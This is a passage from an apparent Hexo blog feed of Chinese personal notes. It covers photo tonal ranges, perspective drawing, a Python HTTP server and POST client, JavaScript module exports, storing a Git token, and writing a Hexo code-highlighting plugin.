title="影调的划分系统"></a>影调的划分系统</h2><p>一般来说是三大调：黑白灰</p><p>具体来说有两种方式表达：</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/3.png"></p><p>以及</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/4.png"></p><p>那么这两种就会排列组合成9种影调以及1个全长调</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/5.png"></p><h2 id="黑白稿画的是什么"><a href="#黑白稿画的是什么" class="headerlink" title="黑白稿画的是什么"></a>黑白稿画的是什么</h2><p>在画黑白稿的时候，就是在确定影调的过程。</p><p>是整体偏暗的低中调，还是比较平均中长调，还是明亮的高中调？</p><h2 id="还有哪些调式"><a href="#还有哪些调式" class="headerlink" title="还有哪些调式"></a>还有哪些调式</h2><ul><li>高调、中间调、低调</li><li>软调、硬调</li><li>冷调、暖调</li><li>对比色调、调和色调</li><li>纯调、灰调</li></ul><h1 id="锐化"><a href="#锐化" class="headerlink" title="锐化"></a>锐化</h1><h2 id="心理上的感受"><a href="#心理上的感受" class="headerlink" title="心理上的感受"></a>心理上的感受</h2><p>发虚的轮廓让人感到着急，看不清</p><h2 id="如何做两级精细化处理"><a href="#如何做两级精细化处理" class="headerlink" title="如何做两级精细化处理"></a>如何做两级精细化处理</h2><ol><li>选择颜色模式为lab模式</li><li>在通道中只选择明度通道</li><li>USM锐化做两次（半径：5， 1.2）</li><li>回到RGB模式不拼合即可</li></ol><h1 id="塑造光线"><a href="#塑造光线" class="headerlink" title="塑造光线"></a>塑造光线</h1><p>两种方式</p><ol><li>画笔</li><li>径向模糊</li></ol><h2 id="径向模糊"><a href="#径向模糊" class="headerlink" title="径向模糊"></a>径向模糊</h2><ol><li>色阶调整到只有光源</li><li>径向模糊</li><li>滤色模式</li></ol>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习编程的网站</title>
      <link href="/2021/07/17/%E5%AD%A6%E4%B9%A0%E7%BC%96%E7%A8%8B%E7%9A%84%E7%BD%91%E7%AB%99/"/>
      <url>/2021/07/17/%E5%AD%A6%E4%B9%A0%E7%BC%96%E7%A8%8B%E7%9A%84%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>1.cppreference<br><a href="https://en.cppreference.com/w/">https://en.cppreference.com/w/</a></p><p>2.LearnCpp<br><a href="https://www.learncpp.com/">https://www.learncpp.com/</a></p><p>3.Cplusplus<br><a href="http://www.cplusplus.com/">http://www.cplusplus.com/</a></p><p>4.TutorialsPoint<br><a href="https://www.tutorialspoint.com/cplusplus/index.htm">https://www.tutorialspoint.com/cplusplus/index.htm</a></p><p>5.Awesome C++<br><a href="https://github.com/fffaraz/awesome-cpp">https://github.com/fffaraz/awesome-cpp</a></p><p>6、书栈网<br><a href="https://www.bookstack.cn/">https://www.bookstack.cn/</a></p><p>7.牛客网<br><a href="https://www.nowcoder.com/activity/oj">https://www.nowcoder.com/activity/oj</a></p><p>8.搬书匠<br><a href="http://www.banshujiang.cn/">http://www.banshujiang.cn/</a></p><p>9.程序员刷题网站：LintCode 领扣<br><a href="https://www.lintcode.com/problem/">https://www.lintcode.com/problem/</a></p><p>10、LeetCode/LintCode 题解网站<br><a href="https://www.jiuzhang.com/solution/?utm_source=sc-zhihu-jw0603">https://www.jiuzhang.com/solution/?utm_source=sc-zhihu-jw0603</a></p><p>11、前端界的Dribbble——Codepen<br><a href="https://codepen.io/">https://codepen.io/</a></p><p>12、TheServerSide<br><a href="https://www.theserverside.com/">https://www.theserverside.com/</a></p><p>13、Hacker News<br><a href="http://hackernews.betacat.io/">http://hackernews.betacat.io/</a></p><p>14、karan/Projects<br><a href="https://www.gitmemory.com/karan/Projects">https://www.gitmemory.com/karan/Projects</a></p><p>15.字体动效神器Space Type Generator<br><a href="https://spacetypegenerator.com/">https://spacetypegenerator.com/</a></p><p>16.大学自学网<br><a href="http://v.dxsbb.com/">http://v.dxsbb.com/</a></p><p>17.简单教程<br><a href="https://www.twle.cn/">https://www.twle.cn/</a></p><ul><li><a href="https://www.bilibili.com/video/BV1d44y1q76P">参考来源</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>透视关系</title>
      <link href="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/"/>
      <url>/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>关于透视的教学，参考了<a href="https://www.bilibili.com/video/BV11t411m7Fk">这个视频</a>。</p><p>透视中最重要的一点是确定<code>观察点</code>，有了观察点，就有了<code>视平线</code>x轴与<code>垂直线</code>y轴。</p><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/1.png"></p><h2 id="视平线"><a href="#视平线" class="headerlink" title="视平线"></a>视平线</h2><p>所有平行于地面的线最终都会汇聚到视平线上 </p><h2 id="画面"><a href="#画面" class="headerlink" title="画面"></a>画面</h2><p>只要是物体的线不与画面平行，那么就会发生汇聚</p><h2 id="测定深度"><a href="#测定深度" class="headerlink" title="测定深度"></a>测定深度</h2><p>3种方法:</p><ol><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/2.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/3.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/4.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/5.png"></p></li></ol><p>原理都是利用了平行线都是同一个消失点和等比三角形。</p><h2 id="斜面"><a href="#斜面" class="headerlink" title="斜面"></a>斜面</h2><p>有同一个垂直消失线</p><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python http</title>
      <link href="/2021/07/16/python-http/"/>
      <url>/2021/07/16/python-http/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h2><p>参考一个完整的服务端配置</p><div class="codeBlockContainer"><div class="codeBlockTitle">server.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-string">Very simple HTTP server in python for logging requests</span></span><span class="line"><span class="hljs-string">Usage::</span></span><span class="line"><span class="hljs-string">    ./server.py [&lt;port&gt;]</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line"></br></span><span class="line">token = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;token&quot;</span>).read().strip()</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span>(<span class="hljs-params">BaseHTTPRequestHandler</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_set_response</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.send_response(<span class="hljs-number">200</span>)</span><span class="line">        self.send_header(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/html&#x27;</span>)</span><span class="line">        self.end_headers()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_GET</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        logging.info(<span class="hljs-string">&quot;GET request,\nPath: %s\nHeaders:\n%s\n&quot;</span>, <span class="hljs-built_in">str</span>(self.path), <span class="hljs-built_in">str</span>(self.headers))</span><span class="line">        self._set_response()</span><span class="line">        self.wfile.write(<span class="hljs-string">&quot;GET request for &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.path).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_POST</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        content_length = <span class="hljs-built_in">int</span>(self.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]) <span class="hljs-comment"># &lt;--- Gets the size of data</span></span><span class="line">        post_data = self.rfile.read(content_length) <span class="hljs-comment"># &lt;--- Gets the data itself</span></span><span class="line">        logging.info(<span class="hljs-string">&quot;POST request, Body:\n%s\n&quot;</span>, post_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line">        self._set_response()</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">if</span> (post_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) == <span class="hljs-string">f&quot;token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span>):</span><span class="line">            logging.info(<span class="hljs-string">&quot;[+] Token Success\n&quot;</span>)</span><span class="line">            self.wfile.write(<span class="hljs-string">&quot;Token Success&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            logging.info(<span class="hljs-string">&quot;[-] Token Failed\n&quot;</span>)</span><span class="line">            self.wfile.write(<span class="hljs-string">&quot;Token Failed&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">server_class=HTTPServer, handler_class=S, port=<span class="hljs-number">8080</span></span>):</span></span><span class="line">    logging.basicConfig(level=logging.INFO)</span><span class="line">    server_address = (<span class="hljs-string">&#x27;&#x27;</span>, port)</span><span class="line">    httpd = server_class(server_address, handler_class)</span><span class="line">    logging.info(<span class="hljs-string">&#x27;Starting httpd...\n&#x27;</span>)</span><span class="line">    <span class="hljs-keyword">try</span>:</span><span class="line">        httpd.serve_forever()</span><span class="line">    <span class="hljs-keyword">except</span> KeyboardInterrupt:</span><span class="line">        <span class="hljs-keyword">pass</span></span><span class="line">    httpd.server_close()</span><span class="line">    logging.info(<span class="hljs-string">&#x27;Stopping httpd...\n&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) == <span class="hljs-number">2</span>:</span><span class="line">        run(port=<span class="hljs-built_in">int</span>(argv[<span class="hljs-number">1</span>]))</span><span class="line">    <span class="hljs-keyword">else</span>:</span><span class="line">        run()</span></code></pre></div></div><h2 id="http-Client"><a href="#http-Client" class="headerlink" title="http Client"></a>http Client</h2><p>POST 方法参考</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> urllib3 <span class="hljs-keyword">import</span> PoolManager</span><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode, urljoin</span><span class="line"><span class="hljs-keyword">import</span> chardet</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_chapters</span>()</span></span><span class="line marked"><span class="hljs-function">    <span class="hljs-title">http</span> = <span class="hljs-title">PoolManager</span>()</span></span><span class="line"></br></span><span class="line"><span class="hljs-function">    <span class="hljs-title">post_url</span> = &#x27;<span class="hljs-title">https</span>:</span>//info.support.huawei.com/network/ptmngsys/getTsrevList<span class="hljs-string">&#x27;</span></span><span class="line"><span class="hljs-string">    data = &#123;</span></span><span class="line"><span class="hljs-string">        &#x27;</span>lang<span class="hljs-string">&#x27;: &#x27;</span>CN<span class="hljs-string">&#x27;,</span></span><span class="line"><span class="hljs-string">        &#x27;</span>family<span class="hljs-string">&#x27;: family_str</span></span><span class="line"><span class="hljs-string">    &#125;</span></span><span class="line marked"><span class="hljs-string">    res = http.request(&#x27;</span>POST<span class="hljs-string">&#x27;, post_url, body=urlencode(data),</span></span><span class="line marked"><span class="hljs-string">                       headers=&#123;</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Cookie<span class="hljs-string">&#x27;: &#x27;</span>JSESSIONID=F5D938CEFxxxxxxxxxxxxx4559465B96; infosupport_network_ptmngsys_sticky=pro_dggpmw1tmc02615.huawei.com_8080:<span class="hljs-number">3</span>; hwsso_uniportal=<span class="hljs-string">&quot;&quot;</span>; hwsso_login=<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&#x27;,</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Host<span class="hljs-string">&#x27;: &#x27;</span>info.support.huawei.com<span class="hljs-string">&#x27;,</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Content-<span class="hljs-type">Type</span><span class="hljs-string">&#x27;: &#x27;</span>application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><span class="hljs-string">&#x27;</span></span><span class="line marked"><span class="hljs-string">    &#125;</span></span><span class="line marked"><span class="hljs-string">    )</span></span><span class="line"><span class="hljs-string">    if res.status != 200:</span></span><span class="line"><span class="hljs-string">        print(&quot;Can&#x27;</span>t <span class="hljs-built_in">open</span> web, check cookie value.<span class="hljs-string">&quot;)</span></span><span class="line"><span class="hljs-string">        return</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    encode_type = chardet.detect(res.data)  # 自动判断编码类型</span></span><span class="line"><span class="hljs-string">    body = res.data.decode(encode_type[&#x27;encoding&#x27;])</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript 的export导出方式</title>
      <link href="/2021/07/15/js-module-export/"/>
      <url>/2021/07/15/js-module-export/</url>
      
        <content type="html"><![CDATA[<h2 id="javascript-的两种格式"><a href="#javascript-的两种格式" class="headerlink" title="javascript 的两种格式"></a>javascript 的两种格式</h2><p>javascript 中有两种格式模块</p><ol><li>Nodejs 的 <code>CommonJS</code>模块，简称<code>CJS</code></li><li>ES6模块，简称<code>ESM</code></li></ol><p>引入的方式区别如下：</p><p><img src="/2021/07/15/js-module-export/1.png"></p><p>CJS的导出都是<code>exports</code>，而<code>ESM</code>的导出都是<code>export</code></p><h2 id="CJS-的引入"><a href="#CJS-的引入" class="headerlink" title="CJS 的引入"></a>CJS 的引入</h2><p>使用两个文件来做测试，<code>utils.js</code> 和 <code>test.js</code></p><h3 id="module-exports"><a href="#module-exports" class="headerlink" title="module.exports"></a>module.exports</h3><div class="codeBlockContainer"><div class="codeBlockTitle">utils.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> a = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-keyword">const</span> b = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-built_in">module</span>.exports = a;</span><span class="line"><span class="hljs-built_in">module</span>.exports = b;</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>);</span><span class="line"><span class="hljs-built_in">console</span>.log(utils); <span class="hljs-comment">// [Function: b]</span></span></code></pre></div></div><p>可以看到，这种方法只能导出一个函数</p><h3 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h3><div class="codeBlockContainer"><div class="codeBlockTitle">utils.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">exports</span>.a = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-built_in">exports</span>.b = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x - y;</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>);</span><span class="line"><span class="hljs-built_in">console</span>.log(utils); <span class="hljs-comment">//&#123; a: [Function (anonymous)], b: [Function (anonymous)] &#125;</span></span></code></pre></div></div><p>这种方法可以导出多个函数</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git push 免密执行</title>
      <link href="/2021/07/14/git-push-%E5%85%8D%E5%AF%86%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/14/git-push-%E5%85%8D%E5%AF%86%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>思路是使用github的token来进行登录</p><ul><li><a href="https://segmentfault.com/q/1010000000590947">参考这篇</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">git config --global credential.helper store</span></code></pre></div></div><p>然后在push的时候输入的密码为token值</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo highlight 插件编写</title>
      <link href="/2021/07/13/hexo-highlight-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
      <url>/2021/07/13/hexo-highlight-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="插件编写思路"><a href="#插件编写思路" class="headerlink" title="插件编写思路"></a>插件编写思路</h2><p>首先要编写hexo的插件需要浏览<a href="https://hexo.io/zh-cn/api/">官方文档</a>。</p><p>编写插件的初衷是因为hexo的代码块有以下几点不足：</p><ol><li>对代码块标题的显示不够好</li><li>代码块的高亮只能是<code>&#123;% codeblock mark:2%&#125;</code>的写法才可以，并不是通用写法。</li><li>缺少代码中间添加<code>highlight-next-line</code>等注释可以高亮的功能</li><li>代码块的html结构不够清晰。</li></ol><p>基于此，我们要做的要么是直接修改源码要么就是添加一个插件。</p><h2 id="编写插件的准备工作"><a href="#编写插件的准备工作" class="headerlink" title="编写插件的准备工作"></a>编写插件的准备工作</h2><p>新创建一个<code>hexo</code>实例后，在<code>node_modules</code>文件夹下新建一个以<code>hexo-</code>开头的文件夹。我的为<code>hexo-highlight-mark</code>。<br>然后进入文件夹中执行<code>npm init</code>来初始化npm包，这里的问答可以直接一路回车，后面再在<code>package.json</code>中修改。</p><p>新建<code>index.js</code>文件作为入口文件。</p><p>在根目录中的<code>package.json</code>文件中添加插件的名称和版本号，此时插件就可以以最小单位运行了。</p><h2 id="如何修改代码块结构"><a href="#如何修改代码块结构" class="headerlink" title="如何修改代码块结构"></a>如何修改代码块结构</h2><p>这个插件要修改代码块的结构，可以用到<a href="https://hexo.io/zh-cn/api/filter">过滤器</a>。</p><div class="codeBlockContainer"><div class="codeBlockTitle">index.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-meta">&#x27;use strict&#x27;</span>;</span><span class="line"></br></span><span class="line">hexo.extend.filter.register(<span class="hljs-string">&#x27;before_post_render&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./lib/filter&#x27;</span>), <span class="hljs-number">8</span>);</span></code></pre></div></div><p><code>before_post_render</code>是过滤器在文章渲染之前就介入执行。</p><div class="codeBlockContainer"><div class="codeBlockTitle">./lib/filter.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> rBacktick = <span class="hljs-regexp">/^((?:[^\S\r\n]*&gt;)&#123;0,3&#125;[^\S\r\n]*)(`&#123;3,&#125;|~&#123;3,&#125;)[^\S\r\n]*((?:.*?[^`\s])?)[^\S\r\n]*\n((?:[\s\S]*?\n)?)(?:(?:[^\S\r\n]*&gt;)&#123;0,3&#125;[^\S\r\n]*)\2[^\S\r\n]?(\n+|$)/gm</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">const</span> dataContent = data.content;</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> ((!dataContent.includes(<span class="hljs-string">&#x27;```&#x27;</span>) &amp;&amp; !dataContent.includes(<span class="hljs-string">&#x27;~~~&#x27;</span>)) || (!hljsCfg.enable &amp;&amp; !prismCfg.enable)) <span class="hljs-keyword">return</span>;</span><span class="line"></br></span><span class="line marked">    data.content = dataContent.replace(rBacktick, <span class="hljs-function">(<span class="hljs-params">$<span class="hljs-number">0</span>, start, $<span class="hljs-number">2</span>, _args, _content, end</span>) =&gt;</span> &#123;</span><span class="line marked">        <span class="hljs-comment">// do something</span></span><span class="line marked">    &#125;</span><span class="line">&#125;</span></code></pre></div></div><p>上面的代码就是将<code>data.content</code>中的代码块部分进行匹配并且自定义渲染并返回替换原内容。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>配置调试文件如下：</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/launch.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line">    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;configurations&quot;</span>: [</span><span class="line">        &#123;</span><span class="line">            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;pwa-node&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch Program&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;\\node_modules\\hexo\\bin\\hexo&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;args&quot;</span>: [</span><span class="line">                <span class="hljs-string">&quot;g&quot;</span>,</span><span class="line">                <span class="hljs-string">&quot;--debug&quot;</span></span><span class="line">            ],</span><span class="line marked">            <span class="hljs-attr">&quot;preLaunchTask&quot;</span>: <span class="hljs-string">&quot;npm: clean&quot;</span></span><span class="line">        &#125;</span><span class="line">    ]</span><span class="line">&#125;</span></code></pre></div></div><p>配置前置任务，清除原有的数据</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/tasks.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line"><span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;2.0.0&quot;</span>,</span><span class="line"><span class="hljs-attr">&quot;tasks&quot;</span>: [</span><span class="line">&#123;</span><span class="line"><span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;npm&quot;</span>,</span><span class="line marked"><span class="hljs-attr">&quot;script&quot;</span>: <span class="hljs-string">&quot;clean&quot;</span>,  <span class="hljs-comment">// 名称必须相同，大小写敏感</span></span><span class="line"><span class="hljs-attr">&quot;problemMatcher&quot;</span>: [],</span><span class="line"><span class="hljs-attr">&quot;label&quot;</span>: <span class="hljs-string">&quot;npm: clean&quot;</span>,</span><span class="line"><span class="hljs-attr">&quot;detail&quot;</span>: <span class="hljs-string">&quot;hexo clean&quot;</span></span><span class="line">&#125;</span><span class="line">]</span><span class="line">&#125;</span></code></pre></div></div><h2 id="发布到npm"><a href="#发布到npm" class="headerlink" title="发布到npm"></a>发布到npm</h2><p>要发布npm，需要注册<a href="www.npmjs.com">npm账号</a></p><p>然后在插件文件夹修改好<code>package.json</code>然后运行登录和发布命令即可</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">npm login  <span class="hljs-comment"># 登录</span></span><span class="line">npm publish  <span class="hljs-comment"># 发布文件</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 一劳永逸的 decode 字符串转换方法</title>
      <link href="/2021/07/12/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2/"/>
      <url>/2021/07/12/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="自动检测字符串类型并进行decode"><a href="#自动检测字符串类型并进行decode" class="headerlink" title="自动检测字符串类型并进行decode"></a>自动检测字符串类型并进行decode</h2><ul><li><a href="https://blog.csdn.net/jieli_/article/details/70166244">看这篇文章</a></li></ul><p>当不清楚字符串是什么类型的时候，比如html，此时可以使用<code>chardet</code>模块来进行识别</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> chardet   <span class="hljs-comment">#需要导入这个模块，检测编码格式</span></span><span class="line">encode_type = chardet.detect(html)  </span><span class="line">html = html.decode(encode_type[<span class="hljs-string">&#x27;encoding&#x27;</span>]) <span class="hljs-comment">#进行相应解码，赋给原标识符（变量）</span></span><span class="line">从<span class="hljs-built_in">str</span>到<span class="hljs-built_in">bytes</span>:调用方法encode().</span><span class="line">编码是把Unicode字符串以各种方式编码成为机器能读懂的ASCII字符串</span><span class="line">从<span class="hljs-built_in">bytes</span>到<span class="hljs-built_in">str</span>:调用方法decode().</span></code></pre></div></div><h2 id="UnicodeDecodeError"><a href="#UnicodeDecodeError" class="headerlink" title="UnicodeDecodeError"></a>UnicodeDecodeError</h2><p>当出现<code>UnicodeDecodeError: &#39;gbk&#39; codec can&#39;t decode byte ...</code>，原因是文档中的特殊符号超过了gbk的字符集。</p><p>所以要么使用更广的<code>gb18030</code>要么忽略:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">open</span>(<span class="hljs-type">path</span>, encoding=<span class="hljs-string">&#x27;gb18030&#x27;</span>)   # 更广的字符集</span><span class="line"><span class="hljs-keyword">open</span>(<span class="hljs-type">path</span>, encoding=<span class="hljs-string">&#x27;gb18030&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)   # 更广的字符集，并且错误的忽略</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> decode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相对论</title>
      <link href="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/"/>
      <url>/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/</url>
      
